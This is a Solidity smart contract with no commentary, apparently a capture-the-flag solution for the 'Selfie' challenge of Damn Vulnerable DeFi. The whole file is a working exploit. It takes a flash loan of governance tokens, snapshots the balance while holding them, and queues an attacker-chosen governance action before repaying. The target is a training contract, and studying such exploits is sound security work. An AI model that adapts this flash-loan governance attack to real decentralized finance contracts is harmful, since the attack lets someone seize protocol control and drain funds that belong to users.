pragma solidity >=0.8;

import "../../selfie/SelfiePool.sol";
import "../../selfie/SimpleGovernance.sol";
import "../../DamnValuableTokenSnapshot.sol";

contract AttackSimpleGovernance {

    uint256 public actionIdAttacked;

    SelfiePool private pool;
    SimpleGovernance private simpleGovernance;
    DamnValuableTokenSnapshot private token;
    bytes private calldataTx;

    constructor(address _simpleGovernance, address _pool, address _token) {
        simpleGovernance = SimpleGovernance(_simpleGovernance);
        pool = SelfiePool(_pool);
        token = DamnValuableTokenSnapshot(_token);
    }

    function attack(bytes memory data, uint256 amount) external {
        calldataTx = data;
        pool.flashLoan(amount);
    }

    function receiveTokens(address _token, uint256 amount) external {
        token.snapshot();
        setAction(calldataTx);
        DamnValuableTokenSnapshot(_token).transfer(msg.sender, amount);
    }

    function setAction(bytes memory data) private {
        actionIdAttacked = simpleGovernance.queueAction(address(pool), data, 0);
    }
}